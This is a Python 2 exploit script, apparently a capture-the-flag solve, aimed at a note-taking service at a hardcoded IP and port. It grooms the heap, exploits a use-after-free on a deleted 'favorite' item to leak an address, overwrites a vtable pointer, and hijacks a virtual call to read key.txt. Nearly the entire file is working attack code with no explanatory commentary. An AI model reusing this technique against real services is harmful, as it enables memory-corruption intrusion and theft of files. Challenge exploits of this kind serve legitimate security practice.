#!/usr/bin/env python
import sys
import re
import struct
from sock import Sock
import subprocess

#TARGET = ("localhost", 37717)
TARGET = ("54.218.22.41", 37717)

binf = "main"
obj = "Apple"
NUM_NOTES = 16
CLASS_SIZE = 16
entirety = ""
DEBUG = False # if it was compiled in debug mode
def get_offset():
  out = subprocess.check_output(["readelf", "-a", binf])
#  print out
  vtloc = int(re.findall("^.*?:.*?([0-9a-fA-F]+).*"+obj+".*$",
      out, flags=re.M)[0],16) + 0x10
  data = re.findall(r"^.*\.data\.rel\.ro +PROGBITS.*?([0-9a-fA-F]+).*$", out, re.M)[0]
  data = int(data,16)
  # we want the first pointer in the vtable
  # to be read_note_from_file which is the 5th pointer in the pointer array
  # add 0x20 to account for this
  data += 0x20
  print hex(vtloc), hex(data)
  return data - vtloc
OFFSET = get_offset()

so = Sock(*TARGET)

def print_all(pri=False):
  global entirety
  z = so.read_one()
  if pri:
    print z
  entirety += z

def do_send(x, pri=False):
#  print repr(x)
  so.send(x)
  print_all(pri)

print_all()

# Allocate some notes with the item in the middle
for i in range(NUM_NOTES/2):
  do_send("2\n" + "A"*(CLASS_SIZE-1) + "\n")

do_send("6\n0\n") # make item
do_send("6\n0\n") # make item
do_send("6\n0\n") # make item

for i in range(NUM_NOTES/2):
  do_send("2\n" + "A"*(CLASS_SIZE-1) + "\n")

do_send("1\n") # print notes

do_send("9\n0\n") # make item favorite
do_send("8\n0\n") # delete item

# allocate note to go in slot made by deleted item
do_send("2\n" + "A"*16 + "\n")
do_send("1\n")

do_send("10\n0\n") # change favorite item / leak address in note

do_send("1\n")

z = so.read_until("Choose an option:")

#print z

if DEBUG:
  addr = re.findall("#16: (.*) 0x[a-fA-F0-9]+", z)[-1]
else:
  addr = re.findall("#16: (.*)", z)[-1]

#print repr(addr)

pad_addr = addr+ "\x00" * (8 - len(addr))

#print repr(pad_addr)

int_addr = struct.unpack("<Q", pad_addr)[0]

print hex(int_addr)

#print "Addr: {:x} {!r}".format(int_addr, addr)

# zero memory
for i in range(CLASS_SIZE-1, len(addr), -1):
  do_send("3\n" + str(NUM_NOTES)+"\n" + "A"*(i)+"\n")

#print hex(int_addr)

#print hex(int_addr + OFFSET)

new_addr = struct.pack("<Q", int_addr + OFFSET)
new_addr = new_addr.split("\x00")[0]

#print "New Addr: " + repr(new_addr)

# write our addr to the newly created memory
do_send("3\n" +str(NUM_NOTES)+"\n"+new_addr+"\n")
do_send("1\n")

# query favorite item and jump to our address
do_send("11\n")

#print hex(int_addr + OFFSET)

do_send("key.txt\n")

do_send("1\n", True)

#for i in range(NUM_NOTES - NUM_FREE):
#  sys.stdout.write("3\n" + "A"*32 + "\n")
